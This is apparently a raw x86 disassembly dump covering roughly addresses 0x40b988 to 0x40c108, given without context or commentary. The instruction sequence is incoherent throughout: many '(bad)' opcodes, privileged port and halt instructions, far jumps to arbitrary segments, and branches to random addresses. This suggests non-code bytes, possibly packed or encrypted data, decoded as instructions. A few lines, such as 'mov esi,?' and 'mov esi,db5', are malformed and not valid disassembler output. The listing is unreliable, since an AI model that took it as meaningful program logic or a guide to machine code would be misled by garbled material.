  40b988:	push   esi
  40b989:	(bad)  
  40b98a:	cs jle 0x40b9a9
  40b98d:	adc    edx,DWORD PTR [ecx]
  40b98f:	xchg   ebx,eax
  40b990:	loope  0x40b9ea
  40b992:	xor    eax,0x843123e1
  40b997:	cld    
  40b998:	adc    cl,bl
  40b99a:	jl     0x40b94b
  40b99c:	lahf   
  40b99d:	pop    edx
  40b99e:	dec    edi
  40b99f:	pushf  
  40b9a0:	vxorps xmm3,xmm6,XMMWORD PTR [ecx-0x69]
  40b9a5:	mov    edi,0xbc14ba2c
  40b9aa:	jmp    0x40ba06
  40b9ac:	subps  xmm2,XMMWORD PTR [edx-0x28]
  40b9b0:	dec    esp
  40b9b1:	add    BYTE PTR [ecx+0xa20aea],bl
  40b9b7:	ror    esp,1
  40b9b9:	int3   
  40b9ba:	aad    0x1a
  40b9bc:	mov    esi,DWORD PTR [edx+0x1a3a630f]
  40b9c2:	jnp    0x40ba0b
  40b9c4:	cld    
  40b9c5:	dec    ecx
  40b9c6:	and    dh,BYTE PTR [esi]
  40b9c8:	fimul  DWORD PTR [edi+0x98acb77]
  40b9ce:	mov    WORD PTR [esp+edx*1],cs
  40b9d1:	xabort 0xab
  40b9d4:	jbe    0x40b98e
  40b9d6:	aaa    
  40b9d7:	pop    eax
  40b9d8:	sbb    al,0x1c
  40b9da:	inc    eax
  40b9db:	mov    ecx,0x3a540e82
  40b9e0:	popa   
  40b9e1:	xchg   ecx,eax
  40b9e2:	loopne 0x40b96c
  40b9e4:	jmp    0x40b9d8
  40b9e6:	pop    esi
  40b9e7:	cmp    eax,0x230ebed1
  40b9ec:	out    dx,eax
  40b9ed:	fcom   QWORD PTR [edx]
  40b9ef:	jmp    0x40b9a2
  40b9f1:	push   ds
  40b9f2:	mov    bl,0xa1
  40b9f4:	jbe    0x40ba17
  40b9f6:	jmp    0x4716:0x544c48a7
  40b9fd:	adc    al,0x6
  40b9ff:	shr    BYTE PTR [edi],0x9b
  40ba02:	push   edx
  40ba03:	es inc esi
  40ba05:	cwde   
  40ba06:	minps  xmm6,XMMWORD PTR [eax+edi*1+0x1f]
  40ba0b:	push   ds
  40ba0c:	xchg   esi,eax
  40ba0d:	es stos DWORD PTR es:[edi],eax
  40ba0f:	lahf   
  40ba10:	inc    eax
  40ba11:	add    al,0xcf
  40ba13:	dec    ecx
  40ba14:	lea    edx,[eax]
  40ba16:	and    BYTE PTR [ebp-0x19defb1b],dh
  40ba1c:	or     esi,edi
  40ba1e:	fstp   QWORD PTR [ebp+0x2f8b344d]
  40ba24:	cmp    eax,0x636d4d6f
  40ba29:	cwde   
  40ba2a:	and    ch,BYTE PTR [edx+0x6b0708f1]
  40ba30:	ins    DWORD PTR es:[edi],dx
  40ba31:	les    edi,FWORD PTR [ecx+0xc]
  40ba34:	or     ah,ch
  40ba36:	sar    DWORD PTR [edi-0x42],1
  40ba39:	pop    ecx
  40ba3a:	adc    eax,DWORD PTR ds:0x72f21b46
  40ba40:	add    bh,BYTE PTR [ecx]
  40ba42:	mov    ah,ah
  40ba44:	xchg   edi,eax
  40ba45:	lahf   
  40ba46:	or     eax,eax
  40ba48:	add    ch,BYTE PTR ss:[edx+ecx*4]
  40ba4c:	push   es
  40ba4d:	push   edi
  40ba4e:	pushf  
  40ba4f:	dec    ecx
  40ba50:	or     eax,DWORD PTR [edi]
  40ba52:	dec    ebp
  40ba53:	call   0x608b:0xa5e2243e
  40ba5a:	inc    esp
  40ba5b:	xor    DWORD PTR [eax+0x1558924a],esp
  40ba61:	mov    al,BYTE PTR [ecx-0x66]
  40ba64:	add    eax,0x9e5bb8a1
  40ba69:	adc    eax,0x591d3784
  40ba6e:	pop    esp
  40ba6f:	loopne 0x40baa8
  40ba71:	leave  
  40ba72:	sbb    BYTE PTR [eax*2+0x4e5af8dd],ch
  40ba79:	sbb    BYTE PTR [ebp-0x4c133cf7],dl
  40ba7f:	xchg   edx,eax
  40ba80:	pop    ss
  40ba81:	stos   DWORD PTR es:[edi],eax
  40ba82:	cmp    al,0x4a
  40ba84:	add    al,0x4
  40ba86:	aad    0x1f
  40ba88:	repz ret 
  40ba8a:	xor    esi,DWORD PTR ds:0xfccb5e70
  40ba90:	xchg   edx,eax
  40ba91:	icebp  
  40ba92:	je     0x40ba1f
  40ba94:	jnp    0x40bb01
  40ba96:	cmp    edi,DWORD PTR [ecx]
  40ba98:	adc    DWORD PTR [esi+ebx*1+0x10196ca5],ebx
  40ba9f:	add    BYTE PTR [ebp+eax*8+0x2642f991],bl
  40baa6:	dec    eax
  40baa7:	leave  
  40baa8:	inc    ecx
  40baa9:	push   ebx
  40baaa:	mov    bh,0x99
  40baac:	mov    ch,0x34
  40baae:	addr16 in eax,0xe1
  40bab1:	imul   al
  40bab3:	pop    ebx
  40bab4:	sahf   
  40bab5:	cld    
  40bab6:	pop    edi
  40bab7:	pusha  
  40bab8:	and    ebp,edx
  40baba:	push   ecx
  40babb:	xor    BYTE PTR [edx+0x225a1da5],0xde
  40bac2:	jae    0x40bb21
  40bac4:	addr16 mov ds:0x58f,al
  40bac8:	fistp  QWORD PTR [eax]
  40baca:	ret    0x9d93
  40bacd:	and    eax,0xbacd07be
  40bad2:	pop    es
  40bad3:	mov    bl,BYTE PTR [ebx]
  40bad5:	shl    BYTE PTR [esi+0x66b535f6],cl
  40badb:	mov    ah,0xb6
  40badd:	repz sar DWORD PTR [eax-0x3ea68875],1
  40bae4:	adc    BYTE PTR [ecx],0x85
  40bae7:	sbb    ah,bh
  40bae9:	cld    
  40baea:	mov    ah,0x5c
  40baec:	mov    ds:0x1c65b95e,eax
  40baf1:	(bad)  [esi-0x7d572616]
  40baf7:	hlt    
  40baf8:	stos   BYTE PTR es:[edi],al
  40baf9:	test   bl,ch
  40bafb:	ret    
  40bafc:	fadd   DWORD PTR [esi+0x4e]
  40baff:	adc    DWORD PTR [eax+0x32a3cd1a],ebp
  40bb05:	int3   
  40bb06:	cmp    al,0x7f
  40bb08:	pop    eax
  40bb09:	cwde   
  40bb0a:	iret   
  40bb0b:	fidiv  DWORD PTR [edx-0x151a13ee]
  40bb11:	ds or  al,0xae
  40bb14:	sub    eax,0x84538af9
  40bb19:	das    
  40bb1a:	retf   
  40bb1b:	mov    BYTE PTR [eax+0x6a4e8a0f],bh
  40bb21:	or     dh,BYTE PTR [edx]
  40bb23:	das    
  40bb24:	dec    edi
  40bb25:	stos   BYTE PTR es:[edi],al
  40bb26:	ret    
  40bb27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb28:	mov    ebp,0x69d7489
  40bb2d:	pop    eax
  40bb2e:	xor    DWORD PTR [edi-0x14],esi
  40bb31:	push   esp
  40bb32:	and    DWORD PTR [ebp+0x1c47c4b4],ebp
  40bb38:	test   al,0x7f
  40bb3a:	jne    0x40bbac
  40bb3c:	mov    esi,0x8bf50391
  40bb41:	add    ebx,ecx
  40bb43:	xlat   BYTE PTR ds:[ebx]
  40bb44:	add    bl,BYTE PTR [ecx]
  40bb46:	cmp    eax,0x336c8bb4
  40bb4b:	add    eax,0xfc90626b
  40bb50:	push   esi
  40bb51:	xchg   DWORD PTR [esi-0x5b],ebx
  40bb54:	pop    ecx
  40bb55:	nop
  40bb56:	cmp    DWORD PTR [edx],ecx
  40bb58:	std    
  40bb59:	fisttp QWORD PTR [ecx+0x1dc210eb]
  40bb5f:	in     eax,dx
  40bb60:	mov    ds:0xd4e1874a,eax
  40bb65:	xor    eax,0x3a67bfc5
  40bb6a:	pop    ebp
  40bb6b:	xlat   BYTE PTR ds:[ebx]
  40bb6c:	mov    eax,0x46a919d7
  40bb71:	cmp    edx,DWORD PTR [ecx+0x69]
  40bb74:	call   0x507b:0x88a482bb
  40bb7b:	mov    ds:0x8795ad73,al
  40bb80:	dec    edi
  40bb81:	cli    
  40bb82:	push   ss
  40bb83:	adc    DWORD PTR [edi],edx
  40bb85:	xor    BYTE PTR [edx-0x79],bh
  40bb88:	sub    cl,BYTE PTR [esi+0x2]
  40bb8b:	cwde   
  40bb8c:	inc    esi
  40bb8d:	scas   al,BYTE PTR es:[edi]
  40bb8e:	test   eax,0x7048fc28
  40bb93:	sbb    eax,0xe4c56ad3
  40bb98:	add    al,0x57
  40bb9a:	jmp    0xb4cc579c
  40bb9f:	pop    ebx
  40bba0:	add    al,0xab
  40bba2:	jo     0x40bb2a
  40bba4:	and    cl,dl
  40bba6:	and    BYTE PTR ds:0x3a3f58a9,0xf
  40bbad:	pusha  
  40bbae:	fiadd  DWORD PTR [ebp-0x6f]
  40bbb1:	jmp    0xb6de3af2
  40bbb6:	int    0xf2
  40bbb8:	sbb    ebp,ecx
  40bbba:	bnd ja 0x40bbf8
  40bbbd:	repz mov ds:0x1e11a57a,al
  40bbc3:	add    ebx,DWORD PTR [eax+esi*1]
  40bbc6:	fnstcw WORD PTR [edx-0x10]
  40bbc9:	pop    eax
  40bbca:	(bad)  
  40bbcb:	imul   BYTE PTR [eax+ecx*1-0x6c]
  40bbcf:	pop    es
  40bbd0:	jbe    0x40bbe9
  40bbd2:	hlt    
  40bbd3:	test   DWORD PTR [ecx-0x766cb6ee],0x95bfda6b
  40bbdd:	push   0xffffffc4
  40bbdf:	sahf   
  40bbe0:	das    
  40bbe1:	out    0x80,eax
  40bbe3:	sbb    edx,eax
  40bbe5:	and    al,0xd5
  40bbe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbe8:	hlt    
  40bbe9:	push   edx
  40bbea:	fist   DWORD PTR [esi+0x5ef9ab1f]
  40bbf0:	imul   esp,DWORD PTR [edx-0xdbddb3a],0x72
  40bbf7:	out    0xe7,eax
  40bbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfa:	dec    edx
  40bbfb:	pop    esp
  40bbfc:	ret    
  40bbfd:	mov    edx,0x5c646410
  40bc02:	mov    ebx,0xc4bdaad4
  40bc07:	repz push esi
  40bc09:	aad    0xb7
  40bc0b:	cmp    al,0x4e
  40bc0d:	cld    
  40bc0e:	cmc    
  40bc0f:	sub    eax,0x2d28a08e
  40bc14:	inc    edx
  40bc15:	dec    ebx
  40bc16:	cmp    BYTE PTR [ebx+0x36],0x13
  40bc1a:	pusha  
  40bc1b:	popf   
  40bc1c:	push   cs
  40bc1d:	cdq    
  40bc1e:	mov    eax,ds:0xb33d8858
  40bc23:	mov    ah,0xef
  40bc25:	(bad)  
  40bc26:	sub    edx,DWORD PTR ds:0x8521c5d8
  40bc2c:	add    edi,esp
  40bc2e:	imul   ebp,eax,0x38
  40bc31:	scas   eax,DWORD PTR es:[edi]
  40bc32:	retf   
  40bc33:	pop    es
  40bc34:	test   BYTE PTR [eax+0x137e7a5],ah
  40bc3a:	jecxz  0x40bc7b
  40bc3c:	pop    ss
  40bc3d:	loopne 0x40bc7b
  40bc3f:	mov    al,0x9e
  40bc41:	push   esi
  40bc42:	out    dx,al
  40bc43:	in     eax,dx
  40bc44:	mov    al,ds:0xa4938cd1
  40bc49:	adc    DWORD PTR [ebx+0x4be2c7d4],eax
  40bc4f:	add    ebp,DWORD PTR [esi+ebx*1-0x11ac5bf0]
  40bc56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc57:	(bad)  
  40bc58:	sbb    dl,BYTE PTR [ecx-0x4c8a5321]
  40bc5e:	pop    eax
  40bc5f:	jno    0x40bcdb
  40bc61:	cmp    ch,BYTE PTR [edx]
  40bc63:	jp     0x40bc17
  40bc65:	hlt    
  40bc66:	cmp    al,BYTE PTR [ecx+0xe]
  40bc69:	mov    WORD PTR ds:0x31616ec8,gs
  40bc6f:	mov    ds:0xa2a56ed3,al
  40bc74:	loope  0x40bc08
  40bc76:	imul   ebp,DWORD PTR [ecx],0x6b9cfa7e
  40bc7c:	sub    ah,al
  40bc7e:	mov    esp,0x63f5835a
  40bc83:	or     al,0xf4
  40bc85:	cmp    ebx,ebp
  40bc87:	cdq    
  40bc88:	xor    eax,0x7ede73d2
  40bc8d:	add    DWORD PTR [eax],esi
  40bc8f:	push   ss
  40bc90:	inc    ecx
  40bc91:	sahf   
  40bc92:	add    BYTE PTR [edx-0x9d1a405],dh
  40bc98:	pop    edx
  40bc99:	ins    DWORD PTR es:[edi],dx
  40bc9a:	mov    DWORD PTR [esi-0x3c5f25d7],edi
  40bca0:	pop    esi
  40bca1:	aam    0x4b
  40bca3:	scas   eax,DWORD PTR es:[edi]
  40bca4:	out    dx,eax
  40bca5:	adc    esi,DWORD PTR [eax-0x2]
  40bca8:	jo     0x40bd11
  40bcaa:	jns    0x40bc91
  40bcac:	neg    bl
  40bcae:	xor    dl,BYTE PTR [edx-0x613d5181]
  40bcb4:	xchg   edx,eax
  40bcb5:	cwde   
  40bcb6:	jb     0x40bcab
  40bcb8:	push   esp
  40bcb9:	jae    0x40bc76
  40bcbb:	(bad)  [eax+0x72]
  40bcbe:	(bad)  
  40bcbf:	jecxz  0x40bd23
  40bcc1:	lock xchg edi,eax
  40bcc3:	ins    BYTE PTR es:[edi],dx
  40bcc4:	dec    ecx
  40bcc5:	clc    
  40bcc6:	ror    DWORD PTR [esi],cl
  40bcc8:	sbb    BYTE PTR [esi-0x32],dl
  40bccb:	in     al,dx
  40bccc:	int3   
  40bccd:	sub    dh,cl
  40bccf:	mov    esi,?
  40bcd1:	test   esi,eax
  40bcd3:	pop    esp
  40bcd4:	cmp    ebx,0xece6a5d4
  40bcda:	add    ah,BYTE PTR ds:0x7594762b
  40bce0:	icebp  
  40bce1:	in     al,0x4
  40bce3:	ds sbb al,0x35
  40bce6:	inc    esi
  40bce7:	push   edx
  40bce8:	fidiv  DWORD PTR [ecx+eax*8+0x1]
  40bcec:	ret    0xea9f
  40bcef:	pusha  
  40bcf0:	sub    esp,DWORD PTR [esi+0x4d]
  40bcf3:	jge    0x40bd37
  40bcf5:	lods   eax,DWORD PTR ds:[esi]
  40bcf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf7:	sub    BYTE PTR ds:0xa0696df3,0x30
  40bcfe:	and    eax,0xce7a532c
  40bd03:	(bad)  
  40bd04:	jnp    0x40bca2
  40bd06:	test   DWORD PTR [ecx],edx
  40bd08:	add    eax,0xa4f3a7e3
  40bd0d:	ins    DWORD PTR es:[edi],dx
  40bd0e:	cs xchg ebp,eax
  40bd10:	pop    edx
  40bd11:	and    al,0x31
  40bd13:	aas    
  40bd14:	and    al,BYTE PTR [ebx+edx*4-0x6a0b68b4]
  40bd1b:	test   dh,bl
  40bd1d:	repnz dec ecx
  40bd1f:	push   edi
  40bd20:	ret    0x43b4
  40bd23:	cli    
  40bd24:	lock dec ebp
  40bd26:	clc    
  40bd27:	or     eax,0xf00ce7ca
  40bd2c:	aad    0x53
  40bd2e:	aam    0xac
  40bd30:	call   0x37d9:0x1b9fcb58
  40bd37:	(bad)  
  40bd38:	(bad)  
  40bd3a:	xor    ebp,DWORD PTR [esi]
  40bd3c:	jmp    0x4d20530a
  40bd41:	rcr    DWORD PTR [eax],1
  40bd43:	shr    BYTE PTR ds:0xf14e2498,0x96
  40bd4a:	cwde   
  40bd4b:	mov    ds:0x1964168f,eax
  40bd50:	addr16 (bad) 
  40bd52:	neg    DWORD PTR [edi+eax*4-0x2c]
  40bd56:	mov    eax,DWORD PTR [edx]
  40bd58:	push   ds
  40bd59:	retf   0x7cf8
  40bd5c:	mov    eax,0xc94b93e8
  40bd61:	popa   
  40bd62:	aad    0xdd
  40bd64:	xor    esp,DWORD PTR [ebx-0x71cf65d0]
  40bd6a:	xor    eax,0x478cd402
  40bd6f:	(bad)  
  40bd70:	and    DWORD PTR [ecx-0x7f],eax
  40bd73:	std    
  40bd74:	data16 (bad) 
  40bd76:	mov    bh,0xb4
  40bd78:	popa   
  40bd79:	inc    edx
  40bd7a:	pusha  
  40bd7b:	into   
  40bd7c:	sbb    BYTE PTR [ecx+0x2f],bh
  40bd7f:	jno    0x40bd26
  40bd81:	addr16 and bh,al
  40bd84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd85:	add    edi,DWORD PTR [ecx+0x5171be5b]
  40bd8b:	adc    BYTE PTR fs:0x6b05e4ac,cl
  40bd92:	lock not DWORD PTR [edi+0x98147f]
  40bd99:	int    0x60
  40bd9b:	jle    0x40bdd4
  40bd9d:	and    eax,0x498c0dd
  40bda2:	pop    ecx
  40bda3:	xchg   bp,ax
  40bda5:	inc    ecx
  40bda6:	jns    0x40bde5
  40bda8:	sub    ch,bh
  40bdaa:	out    0x15,al
  40bdac:	loope  0x40bd46
  40bdae:	test   BYTE PTR [esi-0xe],bl
  40bdb1:	test   DWORD PTR [esi],0x7073e060
  40bdb7:	jns    0x40bde5
  40bdb9:	(bad)  ds:0xcf8716f0
  40bdbf:	jge    0x40bd6f
  40bdc1:	xlat   BYTE PTR ds:[ebx]
  40bdc2:	or     eax,esi
  40bdc4:	ins    BYTE PTR es:[edi],dx
  40bdc5:	and    BYTE PTR [ecx-0x2c7c5290],cl
  40bdcb:	test   eax,0x12e3abc6
  40bdd0:	fdiv   QWORD PTR [edi]
  40bdd2:	fs jg  0x40bd9a
  40bdd5:	jns    0x40be3c
  40bdd7:	bound  esi,QWORD PTR [edx+0x13]
  40bdda:	inc    edx
  40bddb:	push   ss
  40bddc:	pop    ecx
  40bddd:	pop    edx
  40bdde:	cmp    BYTE PTR [esi],dh
  40bde0:	loope  0x40bd85
  40bde2:	adc    dh,BYTE PTR [ecx*4-0x77885d5a]
  40bde9:	inc    edx
  40bdea:	or     ebp,DWORD PTR [ecx]
  40bdec:	mul    DWORD PTR [eax]
  40bdee:	jmp    0xad44579b
  40bdf3:	into   
  40bdf4:	in     al,0xc0
  40bdf6:	sub    edi,eax
  40bdf8:	sub    dl,0xf
  40bdfb:	lods   al,BYTE PTR ds:[esi]
  40bdfc:	enter  0xc102,0xe9
  40be00:	add    cl,BYTE PTR [ebx-0x7a165fb3]
  40be06:	add    eax,0xfd7d0000
  40be0b:	or     BYTE PTR [edx+eax*4],0x79
  40be0f:	js     0x40be8d
  40be11:	xor    edi,DWORD PTR [edx-0x34]
  40be14:	outs   dx,BYTE PTR ds:[esi]
  40be15:	and    cl,BYTE PTR [edi-0x17e0916a]
  40be1b:	push   ss
  40be1c:	push   ss
  40be1d:	cmp    eax,0x83161604
  40be22:	cmc    
  40be23:	dec    eax
  40be24:	ss push eax
  40be26:	sbb    al,BYTE PTR [ebx-0x5b]
  40be29:	pop    ds
  40be2a:	or     al,0xd0
  40be2c:	fcom   DWORD PTR [ebx+eiz*1]
  40be2f:	retf   0x9a8c
  40be32:	xchg   ebp,eax
  40be33:	sub    eax,0x2b6996f
  40be38:	pop    es
  40be39:	sbb    BYTE PTR [ecx],ah
  40be3b:	push   edx
  40be3c:	xchg   edx,eax
  40be3d:	repnz push es
  40be3f:	stc    
  40be40:	mov    ebp,0xc1c38891
  40be45:	push   cs
  40be46:	and    bh,BYTE PTR [edx+0x40]
  40be49:	pop    esi
  40be4a:	(bad)
  40be4e:	mov    dh,0x7a
  40be50:	daa    
  40be51:	add    bl,dh
  40be53:	cdq    
  40be54:	lods   al,BYTE PTR ds:[esi]
  40be55:	in     al,dx
  40be56:	pop    bx
  40be58:	jb     0x40bde0
  40be5a:	jle    0x40bea3
  40be5c:	stc    
  40be5d:	jge    0x40be7d
  40be5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be60:	pusha  
  40be61:	popa   
  40be62:	mov    esp,0xf5d7cd80
  40be67:	or     DWORD PTR [ebp-0x602f6483],0xffffffb0
  40be6e:	arpl   ax,cx
  40be70:	test   BYTE PTR [ebp+0x10869208],0xe9
  40be77:	cmp    dh,BYTE PTR [edx+ebp*8-0x753fb390]
  40be7e:	or     al,0x11
  40be80:	fist   DWORD PTR [eax]
  40be82:	lock jg 0x40beb2
  40be85:	ja     0x40bee6
  40be87:	fimul  WORD PTR [edi-0x71]
  40be8a:	mov    eax,ds:0xa01b8fba
  40be8f:	popf   
  40be90:	in     eax,dx
  40be91:	scas   al,BYTE PTR es:[edi]
  40be92:	popf   
  40be93:	daa    
  40be94:	or     bh,BYTE PTR [ecx]
  40be96:	cwde   
  40be97:	dec    esi
  40be98:	daa    
  40be99:	push   cs
  40be9a:	aad    0x7d
  40be9c:	jecxz  0x40beca
  40be9e:	js     0x40be7f
  40bea0:	jge    0x40be8f
  40bea2:	mov    ah,0x65
  40bea4:	xchg   esp,eax
  40bea5:	arpl   WORD PTR [edx+0x45],sp
  40bea8:	sub    al,0xa9
  40beaa:	div    DWORD PTR [ebx-0x40f87299]
  40beb0:	(bad)  
  40beb1:	and    eax,0x1aaf5e22
  40beb6:	jnp    0x40bf15
  40beb8:	sub    ebx,DWORD PTR [edx]
  40beba:	and    BYTE PTR [ebp+0xa],bh
  40bebd:	mov    dl,0x3
  40bebf:	fcomp  DWORD PTR [eax]
  40bec1:	outs   dx,BYTE PTR ds:[esi]
  40bec2:	(bad)  
  40bec3:	fmulp  st(3),st
  40bec5:	dec    ecx
  40bec6:	jns    0x40be4f
  40bec8:	push   esp
  40bec9:	add    BYTE PTR [edi],dl
  40becb:	inc    ebp
  40becc:	jmp    0xdd2e5833
  40bed1:	adc    DWORD PTR [esi+0x45f163cc],ecx
  40bed7:	outs   dx,DWORD PTR ds:[esi]
  40bed8:	sub    ah,BYTE PTR [edx+0x7427606b]
  40bede:	repz ret 0xe14e
  40bee2:	cmp    edi,edi
  40bee4:	shr    DWORD PTR ds:0xe21308b3,0x20
  40beeb:	jmp    0xed20:0xdd5b84c
  40bef2:	cmp    DWORD PTR [ebx-0x169139d7],esp
  40bef8:	ds loopne 0x40bf51
  40befb:	(bad)  
  40befc:	ror    BYTE PTR [esi-0x38],1
  40beff:	sub    cl,bl
  40bf01:	es loop 0x40bef9
  40bf04:	mov    cl,0x29
  40bf06:	mov    ebp,0x7cf9fc23
  40bf0b:	xor    al,0x14
  40bf0d:	mov    esi,db5
  40bf10:	xor    eax,0xe6bf6f4a
  40bf15:	pushf  
  40bf16:	adc    cl,dl
  40bf18:	ins    BYTE PTR es:[edi],dx
  40bf19:	mov    al,ds:0xb9e8f65e
  40bf1e:	sub    eax,0xf868c214
  40bf23:	fimul  DWORD PTR [eax-0x24]
  40bf26:	mov    ah,0xef
  40bf28:	mov    ds:0x16962690,eax
  40bf2d:	jge    0x40bebe
  40bf2f:	fs (bad) 
  40bf31:	mov    cs,esi
  40bf33:	addr16 out dx,al
  40bf35:	fs xchg edx,eax
  40bf37:	repz bound edi,QWORD PTR [esi+0x34]
  40bf3b:	add    eax,0xaf0e84d6
  40bf40:	dec    ebp
  40bf41:	push   0xffffffed
  40bf43:	pushf  
  40bf44:	xchg   edx,eax
  40bf45:	add    ah,ah
  40bf47:	and    al,0x47
  40bf49:	clc    
  40bf4a:	js     0x40bf85
  40bf4c:	mov    ebx,0xc4fc0bf4
  40bf51:	sahf   
  40bf52:	pop    ecx
  40bf53:	scas   al,BYTE PTR es:[edi]
  40bf54:	sti    
  40bf55:	mov    esi,0xa0f36066
  40bf5a:	retf   
  40bf5b:	and    cl,BYTE PTR [ebp+esi*2-0x7568150b]
  40bf62:	mov    ds:0x65bc144a,eax
  40bf67:	fdivr  QWORD PTR [ebp-0x456c829e]
  40bf6d:	das    
  40bf6e:	in     eax,dx
  40bf6f:	clc    
  40bf70:	fimul  DWORD PTR [eax-0x20224411]
  40bf76:	mov    WORD PTR [edx-0x77b0b841],gs
  40bf7c:	sbb    edx,edi
  40bf7e:	aad    0xa0
  40bf80:	mov    bl,0x34
  40bf82:	outs   dx,DWORD PTR ds:[esi]
  40bf83:	and    DWORD PTR [edx-0x50],0x5e
  40bf87:	xchg   ebp,eax
  40bf88:	fmul   st,st(4)
  40bf8a:	and    edx,esi
  40bf8c:	rcr    BYTE PTR [edx-0x1c],cl
  40bf8f:	fcmovnbe st,st(7)
  40bf91:	retf   
  40bf92:	add    esi,ecx
  40bf94:	scas   eax,DWORD PTR es:[di]
  40bf96:	out    0xd4,eax
  40bf98:	and    dh,BYTE PTR [ecx+0x4b]
  40bf9b:	sbb    BYTE PTR [edx-0x68fbd14c],dh
  40bfa1:	(bad)  
  40bfa2:	mov    ah,0xdd
  40bfa4:	addr16 mov al,ds:0x9f21
  40bfa8:	cdq    
  40bfa9:	mov    al,0xed
  40bfab:	xchg   ebp,eax
  40bfac:	scas   al,BYTE PTR es:[edi]
  40bfad:	or     DWORD PTR [esp+esi*2],esi
  40bfb0:	lds    edi,FWORD PTR [ebp+0xf]
  40bfb3:	dec    edx
  40bfb4:	inc    esp
  40bfb5:	(bad)  
  40bfb6:	dec    edi
  40bfb7:	jno    0x40bfd6
  40bfb9:	cs mov esp,0xde57c613
  40bfbf:	mov    edi,0x29f89952
  40bfc4:	out    0xf7,al
  40bfc6:	aaa    
  40bfc7:	test   BYTE PTR [ebx+0x78d05c5c],ch
  40bfcd:	add    BYTE PTR ss:[edx-0x7d],bl
  40bfd1:	cdq    
  40bfd2:	shl    dl,cl
  40bfd4:	call   0x6a5599ec
  40bfd9:	scas   al,BYTE PTR es:[edi]
  40bfda:	sbb    DWORD PTR [edi+0x20b91ff6],0x2b62c57
  40bfe4:	push   edi
  40bfe5:	(bad)  
  40bfe7:	mov    DWORD PTR [ebp+0x5e],eax
  40bfea:	(bad)  
  40bfeb:	mov    al,ds:0xabf72c17
  40bff0:	cmp    eax,DWORD PTR [ebx]
  40bff2:	push   edx
  40bff3:	mov    dl,0x93
  40bff5:	dec    edi
  40bff6:	ds cld 
  40bff8:	pop    es
  40bff9:	or     DWORD PTR [esi],esi
  40bffb:	xchg   ebx,eax
  40bffc:	pop    ebx
  40bffd:	int3   
  40bffe:	pop    ds
  40bfff:	sub    ebx,DWORD PTR [ecx]
  40c001:	lock rcl BYTE PTR fs:[ebp+0x5],cl
  40c006:	in     eax,dx
  40c007:	pop    ds
  40c008:	push   0x4358950a
  40c00d:	call   0x394e0634
  40c012:	pop    es
  40c013:	sub    BYTE PTR [eax],al
  40c015:	push   cs
  40c016:	rcr    DWORD PTR [ebx-0x2aa8c58],cl
  40c01c:	mov    esp,0x3a8ba53a
  40c021:	push   ebp
  40c022:	mov    bh,0x1b
  40c024:	in     eax,dx
  40c025:	xchg   esi,eax
  40c026:	adc    ah,BYTE PTR [edi-0x32b35446]
  40c02c:	push   es
  40c02d:	pop    es
  40c02e:	add    ch,ah
  40c030:	shl    BYTE PTR [eax],cl
  40c032:	dec    edx
  40c033:	jp     0x40c078
  40c035:	loopne 0x40c024
  40c037:	ja     0x40c056
  40c039:	inc    ecx
  40c03a:	push   es
  40c03b:	jle    0x40c0ae
  40c03d:	leave  
  40c03e:	cs jae 0x40c030
  40c041:	inc    edi
  40c042:	enter  0x75ec,0x70
  40c046:	mov    eax,ds:0x4f5b7efb
  40c04b:	pop    esp
  40c04c:	jg     0x40c036
  40c04e:	test   ch,dh
  40c050:	cmp    eax,0xf123dbe
  40c055:	jne    0x40c087
  40c057:	jecxz  0x40c00d
  40c059:	lock xor DWORD PTR [edx-0x5fec2b7],ecx
  40c060:	aad    0x85
  40c062:	leave  
  40c063:	ins    DWORD PTR es:[edi],dx
  40c064:	popa   
  40c065:	xchg   edx,esi
  40c067:	popf   
  40c068:	pushf  
  40c069:	fcmovu st,st(6)
  40c06b:	sbb    ecx,DWORD PTR [esi]
  40c06d:	push   0xffffffbe
  40c06f:	mov    ch,0x52
  40c071:	push   0xaeecfbcf
  40c076:	aas    
  40c077:	xor    DWORD PTR [ebx],0x37
  40c07a:	add    bh,BYTE PTR [ebp+0x5]
  40c07d:	push   es
  40c07e:	imul   DWORD PTR [edx+0x6d]
  40c081:	pop    ecx
  40c082:	and    BYTE PTR [eax+0x230d03f1],ah
  40c088:	adc    dh,ah
  40c08a:	push   cs
  40c08b:	jo     0x40c0ec
  40c08d:	mov    cl,BYTE PTR [ecx-0x50e58e1]
  40c093:	xor    BYTE PTR [esp+esi*4],dl
  40c096:	in     al,0x61
  40c098:	add    eax,DWORD PTR [edx+edi*8-0x73c1cc88]
  40c09f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0a0:	jno    0x40c028
  40c0a2:	dec    edi
  40c0a3:	inc    edx
  40c0a4:	push   ds
  40c0a5:	fs mov ebp,ds
  40c0a8:	sbb    esp,DWORD PTR [ebx]
  40c0aa:	mov    bh,0xdb
  40c0ac:	add    eax,edx
  40c0ae:	out    dx,al
  40c0af:	call   0x76ebd6f1
  40c0b4:	add    al,0x73
  40c0b6:	(bad)  
  40c0b7:	ja     0x40c0a1
  40c0b9:	imul   edi,DWORD PTR [edi+0x2e],0xa5d73f15
  40c0c0:	or     DWORD PTR ss:[ebp+0x12522313],esp
  40c0c7:	das    
  40c0c8:	out    dx,al
  40c0c9:	gs jb  0x40c056
  40c0cc:	addr16 addr16 cdq 
  40c0cf:	or     BYTE PTR [ebx+eax*1-0x36],0x44
  40c0d4:	aam    0x8f
  40c0d6:	hlt    
  40c0d7:	and    eax,0x3e81662d
  40c0dc:	repz je 0x40c0a3
  40c0df:	add    BYTE PTR [eax-0x26],al
  40c0e2:	jb     0x40c0cb
  40c0e4:	jg     0x40c0f3
  40c0e6:	scas   al,BYTE PTR es:[edi]
  40c0e7:	or     eax,0x4c81a9a9
  40c0ec:	dec    ebx
  40c0ed:	mov    dl,0xf6
  40c0ef:	(bad)  
  40c0f0:	ins    DWORD PTR es:[edi],dx
  40c0f1:	mov    ecx,0xa4ca8015
  40c0f6:	jmp    0x40c0cb
  40c0f8:	mov    bh,0xb3
  40c0fa:	jmp    0x258a2e1d
  40c0ff:	jg     0x40c086
  40c101:	cdq    
  40c102:	ror    DWORD PTR [eax+0x76a63afe],cl
  40c108:	aad    0x53
